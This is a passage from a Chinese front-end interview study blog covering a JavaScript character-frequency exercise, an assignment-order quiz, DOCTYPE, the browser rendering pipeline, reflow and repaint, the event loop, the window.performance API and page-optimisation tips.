class="line"><span class="comment">  *   frequency('cb'); // 输出 b1c1</span></span><br><span class="line"><span class="comment">  *   frequency('accabcb'); // 输出 a2b2c3</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// 只考虑按字符顺序输出：frequency('dabhppa'); 输出  a2b1d1h1p2</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">frequency</span>(<span class="params">chars</span>) </span>&#123;</span><br><span class="line">  <span class="comment">/* 代码实现 */</span></span><br><span class="line">  <span class="comment">// 思路涉及到排序先想到sort方法，但是sort方法时Array的方法，所以想到先将字符串使用split('')转成数组，用sort()排序后再用join()方法转成字符串</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 第一步：排序</span></span><br><span class="line">  <span class="keyword">var</span> sortChars = chars.split(<span class="string">''</span>).sort(<span class="function">(<span class="params">a, b</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> a.charCodeAt() - b.charCodeAt();</span><br><span class="line">  &#125;).join(<span class="string">''</span>); <span class="comment">// 这样操作之后会得到已排序好的字符</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 第二步：收集key value</span></span><br><span class="line">  <span class="keyword">let</span> obj = &#123;&#125;;</span><br><span class="line">  <span class="keyword">let</span> str = <span class="string">''</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; sortChars.length; i += <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (obj[sortChars[i]]) &#123;</span><br><span class="line">      obj[sortChars[i]]++;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      obj[sortChars[i]] = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">console</span>.log(obj);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 第三步：输出</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> kv <span class="keyword">in</span> obj) &#123;</span><br><span class="line">    str += <span class="string">`<span class="subst">$&#123;kv&#125;</span><span class="subst">$&#123;obj[kv]&#125;</span>`</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">console</span>.log(str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 真实实现，先按数量再按字符输出：frequency('dabhppa');  输出 b1d1h1a2p2</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">frequency</span>(<span class="params">chars</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 待续。。。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><hr><h2 id="面试题"><a href="#面试题" class="headerlink" title="面试题"></a>面试题</h2><p>描述下面的结果，为什么？<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> o1 = &#123;<span class="attr">x</span>: <span class="number">1</span>&#125;;</span><br><span class="line">o2 = o1;</span><br><span class="line">o1.a = o1 = &#123;<span class="attr">x</span>: <span class="number">2</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(o1.a, o2.a); <span class="comment">// undefined &#123;x: 2&#125;</span></span><br></pre></td></tr></table></figure></p><p>解析：<br>第二行代码，a和b指向同一个对象（对象1），共用同一块地址，此时a和b完全相对，o1增加属性，o2也会增加属性<br>第三行代码赋值语句，js赋值语句的顺序是先获取左值(o1.a)再计算右值(o1 = {x: 2})，先取左值o1.a的地址（对象1的地址），再极算右值，这个时候o1会指向一个新的对象2（o2还是对象1），再往左执行，把对象2赋给o1.a，所以o1.a会指向新的地址(对象2)。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(o1, o2, o1.a, o2.a);</span><br><span class="line"><span class="comment">// &#123;x: 1&#125;、&#123;x: 1, a: &#123;x: 2&#125;&#125;、undefined、&#123;x: 2&#125;</span></span><br></pre></td></tr></table></figure></p><hr><h2 id="页面渲染机制与性能优化"><a href="#页面渲染机制与性能优化" class="headerlink" title="页面渲染机制与性能优化"></a>页面渲染机制与性能优化</h2><h3 id="浏览器渲染过程"><a href="#浏览器渲染过程" class="headerlink" title="浏览器渲染过程"></a>浏览器渲染过程</h3><ol><li><p>什么是DOCTYPE及作用<br><code>DTD</code>(<code>document type definitiion</code>，文档类型定义)是一系列的语法规则，用来定义 <code>XML</code> 或 <code>(X)HTML</code>的文件类型。浏览器会使用它来判断文档类型，决定使用何种协议来解析，以及切换浏览器模式。<br><code>DOCTYPE</code> 是用来申明文档类型和 <code>DTD</code> 规范的，一个主要的用途是文件的合法性验证。如果文件代码不合法，那么浏览器解析时会出一些错。<br>指示 web 浏览器关于页面使用哪个 <code>HTML</code> 版本进行编写的指令。</p><ul><li><p>html5</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>html4.01 Strict<br>该 DTD 包含所有 HTML 元素和属性，但不包括展示性的和弃用的元素（比如 font）。不允许框架集（Framesets）。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>html4.01 Transitional<br>该 DTD 包含所有 HTML 元素和属性，包括展示性的和弃用的元素（比如 font）。不允许框架集（Framesets）。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">  <span class="meta">&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" </span></span><br><span class="line"><span class="meta">"http://www.w3.org/TR/html4/loose.dtd"&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>html4.01 Frameset<br>该 DTD 包含所有 HTML 元素和属性，但不包括展示性的和弃用的元素（比如 font）。允许框架集（Framesets）。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">  <span class="meta">&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Frameset//EN" </span></span><br><span class="line"><span class="meta">"http://www.w3.org/TR/html4/frameset.dtd"&gt;</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p>网页请求过程(输入url开始发生了什么)<br><strong>输入url回车 –&gt; 解析url –&gt; DNS解析 –&gt; 建立TCP链接(三次握手) –&gt; 客户端发起请求 –&gt; 服务端响应请求 –&gt; 渲染页面 –&gt; 断开连接</strong></p></li><li><p>浏览器渲染过程</p><blockquote><p>参考：<a href="https://segmentfault.com/a/1190000016458627#articleHeader4" target="_blank" rel="noopener">segmentfault 浏览器渲染过程</a></p></blockquote><ul><li><p>webkit渲染过程图<br><img src="../images/javascript/browser_webkit.png" title="webkit内核渲染过程图"></p></li><li><p>gecko渲染过程图<br><img src="../images/javascript/browser_gecko.png" title="gecko内核渲染过程图"></p></li></ul><p>这两个内核的渲染流程大同小异，主要的过程可以总结为下列5个：</p><ul><li>DomTree: 解析html构建DOM树。</li><li>CssomTree: 解析CSS生成CSSOM规则树。</li><li>RenderObjectTree: 将DOM树与CSSOM规则树合并在一起生成渲染对象树。</li><li>Layout: 遍历渲染树开始布局(layout)，计算每个节点的位置大小信息。</li><li>Painting: 将渲染树每个节点绘制到屏幕。</li></ul></li><li><p>重排（回流）Reflow</p><blockquote><p>参考：<a href="https://segmentfault.com/a/1190000016458627#articleHeader7" target="_blank" rel="noopener">segmentfault 浏览器渲染过程</a></p></blockquote><ul><li><p>定义<br>重排（Reflow）是指元素的大小、位置发生了改变，而导致了布局的变化，从而导致了布局树的重新构建和渲染。</p></li><li><p>触发Reflow<br>1.) 增加、删除、修改 <code>DOM</code> 节点时，会导致 <code>Reflow</code> 或 <code>Repaint</code><br>2.) 移动 <code>DOM</code> 位置的时候，比如某个动画<br>3.) 添加、修改 <code>CSS</code> 样式的时候<br>4.) <code>Resize</code> 窗口的时候，滚动的时候<br>5.) 修改网页字体的时候</p></li><li><p>面试提示：如何避免？</p><p>当然，我们的浏览器不会每一次 <code>Reflow</code> 都立刻执行，而是会积攒一批，这个过程也被成为异步 <code>Reflow</code>，或者增量异步 <code>Reflow</code>。但是有些情况浏览器是不会这么做的，比如：resize窗口，改变了页面默认的字体，等。对于这些操作，浏览器会马上进行 <code>Reflow</code>。</p></li></ul></li><li><p>重绘Repaint</p><ul><li><p>定义<br>重绘是指css样式的改变，但元素的大小和尺寸不变，而导致节点的重新绘制。</p></li><li><p>触发Repaint<br>任何对元素样式，如 <code>background-color</code>、<code>border-color</code>、<code>visibility</code> 等属性的改变。css 和 js 都可能引起重绘。</p></li><li><p>面试提示：如何最小程度的降低Repaint<br>1.) 举例1：需要往 <code>body</code> 中插入 n 个节点，不要 append n次，应该先收集，然后一次 append，尽小的重绘。</p></li></ul></li></ol><ol start="6"><li>布局Layout</li></ol><h3 id="js运行机制"><a href="#js运行机制" class="headerlink" title="js运行机制"></a>js运行机制</h3><p>参考<a href="https://juejin.im/post/59e85eebf265da430d571f89" target="_blank" rel="noopener">掘金 彻底弄懂 JavaScript 执行机制</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="number">1</span>);</span><br><span class="line">setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="number">2</span>);</span><br><span class="line">&#125;, <span class="number">0</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出: 1 3 2</span></span><br><span class="line"><span class="comment">// 因为setTimeout是一个异步任务</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">'A'</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'B'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出: A</span></span><br><span class="line"><span class="comment">// 且浏览器会不断的执行，导致崩溃。因为while是一个同步任务</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">'A'</span>);</span><br><span class="line">setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'B'</span>);</span><br><span class="line">&#125;, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出: A</span></span><br><span class="line"><span class="comment">// setTimeout内部永远不会被执行</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">  setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(i);</span><br><span class="line">  &#125;, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出: 4 4 4 4</span></span><br><span class="line"><span class="comment">// 因为for循环是同步任务，每次循环产生的setTimeout都会放到异步对列中。执行完同步之后再执行异步，此时已经有四个待执行的异步任务了，而因为 i 是一个全局变量，所以会输出4个4</span></span><br><span class="line"><span class="comment">// 即：同步for循环(i=0、i=1、i=2、i=3) -&gt; 异步</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 改进（内部使用自执行函数）：</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">  (<span class="function"><span class="keyword">function</span>(<span class="params">i</span>) </span>&#123;</span><br><span class="line">    setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">console</span>.log(i);</span><br><span class="line">    &#125;, <span class="number">0</span>);</span><br><span class="line">  &#125;)(i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出: 0 1 2 3，注意：内部setTimeout的时间如果设置为3000，则会在3s后输出0 1 2 3</span></span><br></pre></td></tr></table></figure><p>异步任务：</p><ul><li>setTimeout、setInterval</li><li>DOM事件</li><li>ES6 Promise</li></ul><p>原理：js 是单线程的，任务队列分为同步任务和异步任务。</p><h3 id="页面性能监控-performance"><a href="#页面性能监控-performance" class="headerlink" title="页面性能监控 performance"></a>页面性能监控 performance</h3><p><strong> Performance </strong> — 前端性能监控利器</p><blockquote><p>参考：<a href="https://www.cnblogs.com/bldxh/p/6857324.html" target="_blank" rel="noopener">cnblogs Performance 前端性能监控利器</a></p></blockquote><h4 id="navigation属性-页面来源"><a href="#navigation属性-页面来源" class="headerlink" title="navigation属性 页面来源"></a>navigation属性 页面来源</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.performance.navigation</span><br></pre></td></tr></table></figure><table><thead><tr><th style="text-align:left">type常数</th><th style="text-align:left">枚举值</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left">TYPE_NAVIGATE</td><td style="text-align:left">0</td><td style="text-align:left">普通进入，包括：点击链接、在地址栏中输入 URL、表单提交、或者通过除下表中 TYPE_RELOAD 和 TYPE_BACK_FORWARD 的方式初始化脚本。</td></tr><tr><td style="text-align:left">TYPE_RELOAD</td><td style="text-align:left">1</td><td style="text-align:left">通过刷新进入，包括：浏览器的刷新按钮、快捷键刷新、location.reload()等方法。</td></tr><tr><td style="text-align:left">TYPE_BACK_FORWARD</td><td style="text-align:left">2</td><td style="text-align:left">通过操作历史记录进入，包括：浏览器的前进后退按钮、快捷键操作、history.forward()、history.back()、history.go(num)。</td></tr><tr><td style="text-align:left">TYPE_UNDEFINED</td><td style="text-align:left">255</td><td style="text-align:left">其他非以上类型的方式进入。</td></tr></tbody></table><h4 id="memory属性-内存情况"><a href="#memory属性-内存情况" class="headerlink" title="memory属性 内存情况"></a>memory属性 内存情况</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.performance.memory</span><br></pre></td></tr></table></figure><table><thead><tr><th style="text-align:left">属性</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left">jsHeapSizeLimit</td><td style="text-align:left">内存大小限制</td></tr><tr><td style="text-align:left">totalJSHeapSize</td><td style="text-align:left">可使用的内存</td></tr><tr><td style="text-align:left">usedJSHeapSize</td><td style="text-align:left">JS对象(包括V8引擎内部对象)占用的内存，不能大于totalJSHeapSize，如果大于，有可能出现了内存泄漏</td></tr></tbody></table><h4 id="timing属性-所有的时间"><a href="#timing属性-所有的时间" class="headerlink" title="timing属性 所有的时间"></a>timing属性 所有的时间</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.performance.timing</span><br></pre></td></tr></table></figure><p><img src="../images/javascript/js_performance_timing.png" title="performance.timing()" width="100%"><br>按触发顺序排列所有属性：</p><table><thead><tr><th style="text-align:left">属性</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left">navigationStart</td><td style="text-align:left">在同一个浏览器上下文中，前一个网页（与当前页面不一定同域）unload 的时间戳，如果无前一个网页 unload ，则与 fetchStart 值相等</td></tr><tr><td style="text-align:left">unloadEventStart</td><td style="text-align:left">前一个网页（与当前页面同域）unload 的时间戳，如果无前一个网页 unload 或者前一个网页与当前页面不同域，则值为 0</td></tr><tr><td style="text-align:left">unloadEventEnd</td><td style="text-align:left">和 unloadEventStart 相对应，返回前一个网页 unload 事件绑定的回调函数执行完毕的时间戳</td></tr><tr><td style="text-align:left">redirectStart</td><td style="text-align:left">第一个 HTTP 重定向发生时的时间。有跳转且是同域名内的重定向才算，否则值为 0</td></tr><tr><td style="text-align:left">redirectEnd</td><td style="text-align:left">最后一个 HTTP 重定向完成时的时间。有跳转且是同域名内的重定向才算，否则值为 0</td></tr><tr><td style="text-align:left">fetchStart</td><td style="text-align:left">浏览器准备好使用 HTTP 请求抓取文档的时间，这发生在检查本地缓存之前</td></tr><tr><td style="text-align:left">domainLookupStart</td><td style="text-align:left">DNS 域名查询开始的时间，如果使用了本地缓存（即无 DNS 查询）或持久连接，则与 fetchStart 值相等</td></tr><tr><td style="text-align:left">domainLookupEnd</td><td style="text-align:left">DNS 域名查询完成的时间，如果使用了本地缓存（即无 DNS 查询）或持久连接，则与 fetchStart 值相等</td></tr><tr><td style="text-align:left">connectStart</td><td style="text-align:left">HTTP（TCP） 开始建立连接的时间，如果是持久连接，则与 fetchStart 值相等,如果在传输层发生了错误且重新建立连接，则这里显示的是新建立的连接开始的时间</td></tr><tr><td style="text-align:left">connectEnd</td><td style="text-align:left">HTTP（TCP） 完成建立连接的时间（完成握手），如果是持久连接，则与 fetchStart 值相等,如果在传输层发生了错误且重新建立连接，则这里显示的是新建立的连接完成的时间<br><strong>注意</strong>：这里握手结束，包括安全连接建立完成、SOCKS 授权通过</td></tr><tr><td style="text-align:left">secureConnectionStart</td><td style="text-align:left">HTTPS 连接开始的时间，如果不是安全连接，则值为 0</td></tr><tr><td style="text-align:left">requestStart</td><td style="text-align:left">HTTP 请求读取真实文档开始的时间（完成建立连接），包括从本地读取缓存,连接错误重连时，这里显示的也是新建立连接的时间</td></tr><tr><td style="text-align:left">responseStart</td><td style="text-align:left">HTTP 开始接收响应的时间（获取到第一个字节），包括从本地读取缓存</td></tr><tr><td style="text-align:left">responseEnd</td><td style="text-align:left">HTTP 响应全部接收完成的时间（获取到最后一个字节），包括从本地读取缓存</td></tr><tr><td style="text-align:left">domLoading</td><td style="text-align:left">开始解析渲染 DOM 树的时间，此时 Document.readyState 变为 loading，并将抛出 readystatechange 相关事件</td></tr><tr><td style="text-align:left">domInteractive</td><td style="text-align:left">完成解析 DOM 树的时间，Document.readyState 变为 interactive，并将抛出 readystatechange 相关事件，<br><strong>注意</strong>：只是 DOM 树解析完成，这时候并没有开始加载网页内的资源</td></tr><tr><td style="text-align:left">domContentLoadedEventStart</td><td style="text-align:left">DOM 解析完成后，网页内资源加载开始的时间,文档发生 DOMContentLoaded事件的时间</td></tr><tr><td style="text-align:left">domContentLoadedEventEnd</td><td style="text-align:left">DOM 解析完成后，网页内资源加载完成的时间（如 JS 脚本加载执行完毕），文档的DOMContentLoaded 事件的结束时间</td></tr><tr><td style="text-align:left">domComplete</td><td style="text-align:left">DOM 树解析完成，且资源也准备就绪的时间，Document.readyState 变为 complete，并将抛出 readystatechange 相关事件</td></tr><tr><td style="text-align:left">loadEventStart</td><td style="text-align:left">load 事件发送给文档，也即 load 回调函数开始执行的时间,如果没有绑定 load 事件，值为 0</td></tr><tr><td style="text-align:left">loadEventEnd</td><td style="text-align:left">load 事件的回调函数执行完毕的时间,如果没有绑定 load 事件，值为 0</td></tr></tbody></table><p><strong>常用计算：</strong><br>DNS查询耗时 ：domainLookupEnd - domainLookupStart<br>TCP链接耗时 ：connectEnd - connectStart<br>request请求耗时 ：responseEnd - responseStart<br>解析dom树耗时 ： domComplete - domInteractive<br>白屏时间 ：responseStart - navigationStart<br>domready时间(用户可操作时间节点) ：domContentLoadedEventEnd - navigationStart<br>onload时间(总下载时间) ：loadEventEnd - navigationStart</p><h4 id="getEntries-方法-所有资源的信息"><a href="#getEntries-方法-所有资源的信息" class="headerlink" title="getEntries()方法 所有资源的信息"></a>getEntries()方法 所有资源的信息</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.performance.getEntries().forEach(<span class="function"><span class="params">item</span> =&gt;</span> <span class="built_in">console</span>.log(item))</span><br></pre></td></tr></table></figure><p><img src="../images/javascript/js_performace_getEntries1.png" title="performance.getEntries()" width="100%"></p><table><thead><tr><th style="text-align:left">属性</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left">name</td><td style="text-align:left">资源名称，是资源的绝对路径或调用mark方法自定义的名称</td></tr><tr><td style="text-align:left">startTime</td><td style="text-align:left">开始时间</td></tr><tr><td style="text-align:left">duration</td><td style="text-align:left">加载时间</td></tr><tr><td style="text-align:left">entryType</td><td style="text-align:left">资源类型</td></tr><tr><td style="text-align:left">initiatorType</td><td style="text-align:left">谁发起的请求</td></tr></tbody></table><p>全局监控：如果我们想打印当前页面所有资源的信息，可导入下面的脚本。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 浏览器不支持，就算了！</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">window</span>.performance &amp;&amp; !<span class="built_in">window</span>.performance.getEntries) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> result = [];</span><br><span class="line">    <span class="comment">// 获取当前页面所有请求对应的PerformanceResourceTiming对象进行分析</span></span><br><span class="line">    <span class="built_in">window</span>.performance.getEntries().forEach(<span class="function"><span class="keyword">function</span> (<span class="params">perf</span>) </span>&#123;</span><br><span class="line">        result.push(&#123;</span><br><span class="line">            <span class="string">'url'</span>: perf.name,</span><br><span class="line">            <span class="string">'entryType'</span>: perf.entryType,</span><br><span class="line">            <span class="string">'type'</span>: perf.initiatorType,</span><br><span class="line">            <span class="string">'duration(ms)'</span>: perf.duration</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 控制台输出统计结果</span></span><br><span class="line">    <span class="built_in">console</span>.table(result);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p><img src="../images/javascript/js_performace_getEntries2.png" title="performance.getEntries2" width="100%"></p><h3 id="页面性能优化"><a href="#页面性能优化" class="headerlink" title="页面性能优化"></a>页面性能优化</h3><blockquote><p>参考：<a href="https://segmentfault.com/a/1190000016458627#articleHeader17" target="_blank" rel="noopener">segmentfault 浏览器渲染过程</a></p></blockquote><h4 id="网络请求的优化"><a href="#网络请求的优化" class="headerlink" title="网络请求的优化"></a>网络请求的优化</h4><ol><li><p>静态资源<br>1). 拼接、合并、压缩、制作雪碧图<br>使用webpack或者gulp等打包工具对资源（js、css、图片等）进行打包、合并、去重、压缩。对于图片资源，我们可以制作雪碧图。</p><p>2). CDN资源分发<br>将一些静态资源文件托管在第三方CDN服务中，一方面可以减少服务器的压力，另一方面，CDN的优势在于，CDN系统能够实时地根据网络流量和各节点的连接、负载状况以及到用户的距离和响应时间等综合信息将用户的请求重新导向离用户最近的服务节点上，保证资源的加载速度和稳定性。</p><p>3). 缓存<br>缓存的范围很广，比如协议层的DNS解析缓存、代理服务器缓存，到客户端的浏览器本地缓存，再到服务端的缓存。一个网络链路的每个环节都有被缓存的空间。缓存的目的是简化资源的请求路径，比如某些静态资源在客户端已经缓存了，再次请求这个资源，只需要使用本地的缓存，而无需走网络请求去服务端获取。</p><p>4). 分片<br>分片指得是将资源分布到不同的主机，这是为了突破浏览器对同一台主机建立tcp连接的数量限制，一般为6~8个。现代网站的资源数量有50~100个很常见，所以将资源分布到不同的主机上，可以建立更多的tcp请求，降低请求耗时，从而提升网页速度。</p></li></ol><ol start="2"><li><p>业务数据<br>1.）首屏直出<br>为了提升用户体验，我们认为首屏的渲染速度是极为重要的，用户进来页面，首页可见区域的加载可以由服务端渲染，保证了首屏加载速度，而不可见的部分则可以异步加载，甚至做到子路由页面的预加载。</p><p>2.）接口合并<br>前端经常有这样的场景，完成一个功能需要先请求第一个接口获得数据，然后再根据数据请求第二个接口获取第二个数据，然后第三、第四…前端通常需要通过promise或者回调，一层一层的then下去，这样显然是很消耗性能的。<br>应该有服务端处理中间的流程，前端只发一次请求。</p></li></ol><h4 id="页面渲染性能的优化"><a href="#页面渲染性能的优化" class="headerlink" title="页面渲染性能的优化"></a>页面渲染性能的优化</h4><ol><li><p>防止阻塞渲染<br>页面中的css 和 js 会阻塞html的解析，因为他们会影响dom树和render树。为了避免阻塞，我们可以做这些优化：</p><p>1.) css 放在首部，提前加载，这样做的原因是： 通常情况下 CSS 被认为是阻塞渲染的资源，在CSSOM 构建完成之前，页面不会被渲染，放在顶部让样式表能够尽早开始加载。但如果把引入样式表的 link 放在文档底部，页面虽然能立刻呈现出来，但是页面加载出来的时候会是没有样式的，是混乱的。当后来样式表加载进来后，页面会立即进行重绘，这也就是通常所说的闪烁了。</p><p>2.) js文件放在底部，防止阻塞解析</p><p>3.) 一些不改变dom和css的js 使用 <code>defer</code> 和 <code>async</code> 属性告诉浏览器可以异步加载，不阻塞解析</p></li><li><p>减少重排和重绘<br>重绘和回流在实际开发中是很难避免的，我们能做的就是尽量减少这种行为的发生。</p><p>1.) js尽量少访问dom节点和css属性</p><p>2.) 尽可能的为产生动画的 <code>HTML</code> 元素使用 <code>fixed</code> 或 <code>absolute</code> 的 <code>position</code> ，那么修改他们的 <code>CSS</code> 是不会 <code>Reflow</code> 的。</p><p>3.) img标签要设置高宽，以减少重绘重排</p><p>4.) 把DOM离线后修改，如将一个dom脱离文档流，比如 <code>display: none</code> ，再修改属性，这里只发生一次回流。</p><p>5.) 尽量用 <code>transform</code> 来做形变和位移，不会造成回流</p></li><li><p>提高代码质量</p><ul><li><p>html<br>1.) dom层级不要太深，否则会增加dom树构建的时间，js访问深层的dom也会造成更大的负担。</p><p>2.) meta标签里需要定义文档的编码，便于浏览器解析</p></li><li><p>css<br>1.) 减少 CSS 嵌套层级和选择适当的选择器</p><p>2.) 对于首屏的关键css 可以使用style标签内联</p></li><li><p>js<br>1.) 减少通过 <code>JavaScript</code> 代码修改元素样式，尽量使用修改class名方式操作样式或动画。</p><p>2.) 访问dom节点时需要对dom节点转存，防止循环中重复访问dom节点造成性能损耗。</p><p>3.) 慎用 定时器 和 计时器， 使用完后需要销毁。</p><p>4.) 用于复杂计算的js代码可以放在worker进程中运行</p><p>5.) 对于一些高频的回调需要对其节流和消抖，就是 <code>throttle</code> 和 <code>debounce</code> 这两个函数。比如 <code>scroll</code> 和 <code>touch</code> 事件。</p></li></ul></li></ol><h4 id="面试回答"><a href="#面试回答" class="headerlink" title="面试回答"></a>面试回答</h4><ol><li><p>资源压缩、合并，减少HTTP请求</p></li><li><p>非核心代码异步加载<br>1.) 动态脚本加载，使用js动态创建 <code>script</code> 然后插入到 <code>head</code> 中<br>2.) defer，在 <code>HTML</code> 解析完之后才会执行，如果是多个，则按照顺序执行<br>3.) async，加载完之后立即执行，如果是多个，执行顺序和加载顺序无关</p></li></ol><p>  结果：<br>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main</span></span><br><span class="line"><span class="comment">// async1</span></span><br><span class="line"><span class="comment">// async2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 也可能是（当实际文件内容差别大时）：</span></span><br><span class="line"><span class="comment">// main</span></span><br><span class="line"><span class="comment">// 